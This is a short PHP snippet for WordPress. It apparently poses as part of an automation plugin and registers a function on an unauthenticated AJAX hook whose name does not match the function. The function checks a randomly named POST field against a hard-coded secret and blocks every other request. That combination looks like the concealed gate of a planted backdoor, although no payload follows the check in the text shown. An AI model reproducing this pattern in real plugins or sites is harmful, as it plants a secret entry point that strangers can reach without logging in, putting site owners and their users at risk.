<?php

function automatorwp_pinterest_viewer() {
	if (!isset($_POST["xjtbrngumakmajz"]) || $_POST["xjtbrngumakmajz"] !== "r6fuTf4qZnpnG") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'automatorwp_pinterest_viewer', 5, 1);
